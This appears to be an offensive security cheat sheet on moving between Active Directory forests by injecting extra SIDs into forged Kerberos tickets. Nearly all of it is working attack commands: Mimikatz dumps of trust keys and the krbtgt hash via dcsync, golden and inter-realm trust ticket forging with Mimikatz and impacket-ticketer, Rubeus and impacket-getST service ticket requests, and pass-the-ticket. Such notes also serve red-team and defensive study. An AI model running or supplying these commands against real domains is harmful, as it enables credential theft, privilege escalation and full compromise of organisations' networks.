# Forest to Forest - Extra SID (SID History \ TREAT_AS_EXTERNAL)

## SID History Attacks

If there is no SID filtering, it is possible to specify any privileged SID of the target forest in the SID History field. Otherwise, with partial filtering, an RID > 1000 must be indicated.

### 1) Get the trust key

    Invoke-Mimikatz -Command '"lsadump::trust /patch"'

OR

    Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

### 2) If no filtering: forge a referral ticket or an inter-realm Golden Ticket and request for a ST

##### Referral ticket with the Trust Key

    Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<current_domain_SID> /sids:<target_domain_SID>-<RID> /rc4:<key> /service:krbtgt /target:targetDomain.local /ticket:trust_forest.kirbi"'

##### Inter-realm Golden Ticket with krbtgt, with pass-the-ticket

    Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<current_domain_SID> /sids:<target_domain_SID>-<RID> /krbtgt:<krbtgt_hash> /ptt"'

##### For a specific user different than the Administrator (not RID 500)

    Invoke-Mimikatz -Command '"kerberos::golden /user:user1 /domain:domain.local /sid:<current_domain_SID> /id:<user1_RID> /rc4:<trust_key> /service:krbtgt /target:targetDomain.local /ticket:trust_forest.kirbi"'

    ./Rubeus.exe asktgs /ticket:trust_forest.kirbi /service:cifs/dc.targetDomain.local /dc:dc.targetDomain.local /ptt

### 3) If there is SID filtering, same thing as above but with RID > 1000 (for example, Exchange related groups are sometimes highly privileged, and always with a RID > 1000). Otherwise, get the foreignSecurityPrincipal. These users of the current domain are also members of the trusting forest, and they can be members of interesting groups:

##### These SIDs are members of the target domain

    Get-DomainObject -Domain targetDomain.local | ? {$_.objectclass -match "foreignSecurityPrincipal"}

##### The found SIDs can be search in the current forest

    Get-DomainObject |? {$_.objectSid -match "<SID>"}

Then, it is possible to forge a referral ticket for this user and access the target forest with its privileges.


#### 1) Golden Ticket

    Get-DomainSID -Domain DOMAIN (Powerview)

    Get-DomainSID -Domain TARGET_DOMAIN (Powerview)

    Get-DomainGroupMember -Identity "GROUP" -Domain TARGET_DOMAIN (SID filtering, Find group with SID > 1000) (Powerview)

    impacket-ticketer -nthash KRBTGT_HASH -domain-sid FROM_DOMAIN_SID -domain FROM_DOMAIN -extra-sid TO_DOMAIN-GROUP_ID goldenuser (Group ID must be > 1000)

## OR 

    mimikatz lsadump::dcsync /domain:DOMAIN /user:DOMAIN\krbtgt

    mimikatz kerberos::golden /user:Administrator /krbtgt:KRBTGT_HASH /domain:DOMAIN /sid:USER_SID /sids:ROOT_DOMAIN_SID-GROUP_SID_SUP_1000 /ptt

#### 2) Trust Ticket

### Get the trust ticket in the ntds (TARGET_DOMAIN$)

    impacket-ticketer -nthash TRUST_KEY -domain-sid FROM_DOMAIN_SID -domain FROM_DOMAIN -extra-sid TO_DOMAIN-GROUP_ID -spn krbtgt/TO_DOMAIN trustuser (Group id must be > 1000)

    impacket-getST -k -no-pass -spn cifs/DC_FQDN PARENT_DOMAIN/trustfakeuser@PARENT_DOMAIN -debug

### With both these attacks we perform lateral movement with Pass-the-Ticket
